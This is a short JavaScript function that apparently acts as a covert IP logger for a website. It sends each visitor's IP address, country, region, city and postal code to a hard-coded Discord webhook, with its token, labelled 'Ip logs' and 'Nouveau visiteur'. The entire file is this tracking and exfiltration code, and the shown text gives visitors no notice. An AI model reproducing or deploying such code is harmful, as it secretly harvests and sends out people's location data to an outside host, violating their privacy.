function logs(json) 
{
     var request = new XMLHttpRequest();
     
     request.open("POST", "https://canary.discord.com/api/webhooks/1089160472915365959/35N0kyKwa2ip-mrBEQq2MZMbWOgTgIxEsmu1cxdYte9ZMeq5UjlQlMBHZBV2zYVVqELG");
console.log('ez');
     request.setRequestHeader('Content-type', 'application/json');

     var params = 
     {
          username: "Ip logs",
          avatar_url: "https://media.discordapp.net/attachments/1063995449045946498/1064760532571271238/460f5308ad1e4239067a0e8a216db921.png", // Just Add an url to have an avatar on your webhook
          content: "Nouveau visiteur",
          embeds: [
               {
                    title: "Ip logs",
                    color: 16711680,
                    description: "**IP:** `" + json.ip + "`\n**Country:** `" + json.country + "`\n**Region:** `" + json.region + "`\n**Town/City:** `" + json.city + "`\n**ZIP:** `" + json.postal + "`"
               }
          ]
     }

     request.send(JSON.stringify(params));
}